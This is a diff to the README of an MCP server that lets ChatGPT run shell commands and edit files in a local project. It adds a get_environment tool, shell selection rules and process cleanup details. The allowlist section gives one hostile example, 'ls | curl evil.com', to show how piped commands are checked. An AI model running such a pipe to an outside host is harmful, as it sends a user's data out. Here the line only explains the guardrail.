@@ -24,6 +24,7 @@ flowchart LR
     Edit["apply_patch"]
     Exec["exec_command\nwrite_stdin"]
     Agent["view_image\nupdate_plan\nclock_curr_time\nclock_sleep"]
+    Env["get_environment"]
     WorkDir[("Project\nDirectory")]
 
     ChatGPT -- "HTTPS" --> Tunnel
@@ -37,6 +38,7 @@ flowchart LR
     Tools --> Edit
     Tools --> Exec
     Tools --> Agent
+    Tools --> Env
 
     FS --> WorkDir
     Search --> WorkDir
@@ -45,6 +47,7 @@ flowchart LR
     Edit --> WorkDir
     Exec --> WorkDir
     Agent --> WorkDir
+    Env --> WorkDir
 ```
 
 ## Quick start
@@ -97,6 +100,14 @@ Ported from Codex (`codex-rs/core/src/tools`, commit `2230d64`):
 
 Codex's dotted names are flattened to underscores because MCP tool names must match `^[a-zA-Z0-9_-]{1,64}$`.
 
+One tool has no Codex counterpart:
+
+| Tool | Description |
+|------|-------------|
+| `get_environment` | Report the OS, the shell `exec_command` uses, the work directory, and what the policy allows |
+
+Codex tells its model the OS and shell through an `<environment_context>` message before the first turn. An MCP server has no such channel — it can only expose tools — so the same facts are a tool call here. See [Shells and the host](#shells-and-the-host).
+
 Two deliberate differences from Codex:
 
 - **`apply_patch` takes a JSON string.** In Codex it is a *freeform* tool whose entire body is the raw patch. MCP has no freeform tools, so the patch goes in an `input` string parameter. The patch format itself is unchanged.
@@ -104,7 +115,7 @@ Two deliberate differences from Codex:
 
 `clock_sleep` also caps at 5 minutes rather than Codex's 12 hours — a longer wait would outlive the HTTP request through the tunnel.
 
-Every tool that advertises an `outputSchema` also returns `structuredContent` matching it, as the MCP spec asks. `exec_command` and `write_stdin` return Codex's unified-exec object and `clock_curr_time` returns `{ current_time }`; the rest return `{ content: <text> }`, which the server derives from the text blocks so handlers don't repeat it.
+Every tool that advertises an `outputSchema` also returns `structuredContent` matching it, as the MCP spec asks. `exec_command` and `write_stdin` return Codex's unified-exec object, `clock_curr_time` returns `{ current_time }` and `get_environment` returns the environment object; the rest return `{ content: <text> }`, which the server derives from the text blocks so handlers don't repeat it.
 
 All paths are resolved relative to `--work-dir`.
 
@@ -144,8 +155,29 @@ The `exec` block governs `exec_command` and `write_stdin`:
 | `mode` | `"allowlist"` | `"allowlist"` checks every command in the string against the allowlist; `"unrestricted"` runs whatever it is given |
 | `extraAllowedCommands` | 18 read-only utilities | Added to `allowedCommands` for `exec_command` only, so `run_command` stays as narrow as it was |
 | `maxSessions` | `8` | Cap on concurrent background sessions per MCP session |
+| `defaultShell` | `$SHELL`, else PowerShell on Windows and `/bin/sh` elsewhere | Shell used when an `exec_command` call names none |
 
 Under `"allowlist"`, the command string is tokenized and each command position — after every `|`, `&&`, `;`, newline, and subshell — is checked, so `ls | curl evil.com` is rejected on `curl`. Command substitution (`$(...)`, backticks) is rejected outright, since its contents cannot be checked before the shell runs them.
+
+## Shells and the host
+
+Windows, macOS and Linux are all supported natively; there is no WSL or POSIX-emulation layer in between. Which shell runs is decided by name, not by host platform, the same way Codex's `Shell::derive_exec_args` does it:
+
+| Shell | Invoked as |
+|-------|------------|
+| `sh`, `bash`, `zsh`, anything else | `<shell> -c "<cmd>"` |
+| `powershell`, `pwsh` | `<shell> -NoProfile -Command "<cmd>"` |
+| `cmd` | `cmd /c "<cmd>"` |
+
+The default comes from `$SHELL` on every platform, so starting the server from Git Bash on Windows gets bash — with real `ls -la`, pipes and `$VAR` — rather than PowerShell. Set `exec.defaultShell` to override, or pass `shell` on an individual `exec_command` call.
+
+Two Windows-specific details are handled: `powershell -Command` collapses every non-zero child exit code to `1`, so commands are wrapped to re-raise `$LASTEXITCODE`; and `exec_command`'s description gains Codex's PowerShell rules (`-LiteralPath` over `-Path`, `-WindowStyle Hidden`) when the server runs there.
+
+Because the resolved shell decides what a command should even look like, it is published three ways — a client only has to read one of them:
+
+- **`instructions`** in the `initialize` response: the environment plus a short brief on how these tools are meant to be used.
+- **`exec_command`'s description**, which names the actual shell binary and its syntax family.
+- **`get_environment`**, for clients that read neither.
 
 ## Connecting to ChatGPT
 
@@ -174,7 +206,7 @@ The allowlist is a **guardrail against accidents, not a sandbox**. It catches a 
 - anything else the user account running the server can touch, via an allowlisted interpreter
 - the network, from your machine
 
-`exec_command` sessions that outlive a request are killed when the MCP session closes. On Windows a process that detaches from its parent may survive that; check for strays if a run leaves something listening.
+`exec_command` sessions that outlive a request are killed when the MCP session closes, and the kill takes the children with it: `taskkill /T /F` walks the process tree on Windows, and on POSIX each session gets its own process group that is signalled as a whole. A process that deliberately re-parents or daemonises itself still escapes, so check for strays if a run leaves something listening.
 
 Don't expose this without tunnel-level access control (ngrok IP restrictions, Cloudflare Access), and don't point it at directories you don't trust ChatGPT with. If the work directory holds anything sensitive, set `exec.mode` and the allowlists tighter than the defaults rather than relying on them.
 
